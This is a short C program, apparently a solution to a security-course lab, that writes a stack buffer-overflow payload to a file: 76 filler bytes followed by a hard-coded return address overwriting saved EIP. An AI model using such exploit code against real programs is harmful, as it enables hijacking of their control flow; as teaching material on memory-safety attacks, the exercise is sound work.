#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    /* YOUR CODE: Generate buf appropriately */

    char buf[80];
	memset(buf, 'A', 76);  //76 is the distance between buf and eip
	buf[76]=0x3b;
	buf[77]=0x86;
	buf[78]=0x04;
	buf[79]=0x08;
	
    write_to_file( "attack4-payload", buf , 80 , FILE_CLEAR );
    exit(0);
}
